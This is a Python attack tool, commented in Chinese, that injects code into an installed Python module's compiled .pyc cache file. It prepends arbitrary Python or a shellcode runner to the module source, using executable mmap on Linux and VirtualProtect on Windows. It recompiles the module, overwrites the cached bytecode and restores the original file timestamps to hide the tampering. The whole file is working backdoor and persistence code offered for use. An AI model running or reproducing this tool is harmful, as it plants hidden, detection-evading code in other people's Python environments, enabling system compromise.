import importlib
import sys
import marshal
import os
import sys
import datetime
import argparse

def init_shellcode(file_name):
        shellcode=b""
        with open(file_name,"rb") as fp:
            shellcode=fp.read()
        code=""
        if sys.platform.startswith('linux'):
            code="import ctypes\r\n"
            code+="import mmap\r\n"
            code+="mem = mmap.mmap(-1, 4096, mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)\r\n"
            code+="shellcode = b\"" 
            for i in shellcode:
                code+="\\x"+format(i, '02x')
            code+="\"\r\n"
            code+="mem.write(shellcode)\n\r"
            code+="func_ptr = ctypes.CFUNCTYPE(ctypes.c_int)(ctypes.addressof(ctypes.c_int.from_buffer(mem)))\n\r"
            code+="result = func_ptr()\r\n"
            code+="mem.close()\r\n"
            return code
        elif sys.platform.startswith('win'):
            code="import ctypes\r\n"
            code+="shellcode = b\"" 
            for i in shellcode:
                code+="\\x"+format(i, '02x')
            code+="\"\r\n"
            code+="memory = ctypes.create_string_buffer(shellcode, len(shellcode))\n\r"
            code+="ctypes.windll.kernel32.VirtualProtect(ctypes.c_void_p(ctypes.addressof(memory)), len(shellcode), 0x40, ctypes.byref(ctypes.c_ulong()))\n\r"
            code+="shellcode_func = ctypes.cast(ctypes.addressof(memory), ctypes.CFUNCTYPE(None))\r\n"
            code+="shellcode_func()\r\n"
            return code
        else:
            return None


        
        

def check_argument():
    parser = argparse.ArgumentParser(description='pyc代码注入程序')
    parser.add_argument('-m', '--module', help='指定想要注入的模块')
    parser.add_argument('-p', '--python',  action='store_true', help='指定注入python代码，否则注入shellcode')
    parser.add_argument('-f', '--file', help='注入的python代码或shellcode文件路径')

    args = parser.parse_args()

    if args.module:
        module_name=args.module
    else:
        parser.print_help()
        sys.exit(0)
    p=0
    if args.python:
        p=1
    else:
        p=0
    code_file=""
    if args.file:
        code_file=args.file
    else:
        parser.print_help()
        sys.exit(0)
    
    n_code=""
    if p==0:
        n_code=init_shellcode(code_file)
    if p==1:
        with open(code_file,"r") as fp:
            n_code=fp.read()
            n_code+="\n\r"
    return module_name,n_code

if __name__=="__main__":
    module_name,n_code=check_argument()
    
    try:
        #获取要修改的模块路径
        module = importlib.import_module(module_name)
        module_path=module.__file__
        del sys.modules[module_name]
        module_file_name = os.path.splitext(os.path.basename(module_path))[0] 
        #插入新代码
        module_fp=open(module_path,"r")
        module_buf=module_fp.read()
        new_module_buf=n_code+module_buf
        module_fp.close()
        #编译新代码
        code_obj = compile(new_module_buf, '<string>', 'exec')
        pyc = marshal.dumps(code_obj)
        
        #编译好的新代码更新到原始pyc文件中
        module_dir=os.path.dirname(module_path)
        module_pyc_path=os.path.join(module_dir,"__pycache__",module_file_name+".cpython-3"+str(sys.version_info.minor)+".pyc")
        
        file_stat = os.stat(module_pyc_path)
        create_time = datetime.datetime.fromtimestamp(file_stat.st_ctime)
        modify_time = datetime.datetime.fromtimestamp(file_stat.st_mtime)
        
        fp=open(module_pyc_path,"rb")
        module_pyc=fp.read()
        fp.close()

        new_module_pyc=module_pyc[:16]+pyc

        fp=open(module_pyc_path,"wb")
        fp.write(new_module_pyc)
        fp.close()
        
        os.utime(module_pyc_path, (create_time.timestamp(), modify_time.timestamp()))
        #测试是否修改成功
        #module = importlib.import_module(module_name)
    except Exception as e:
        print(e)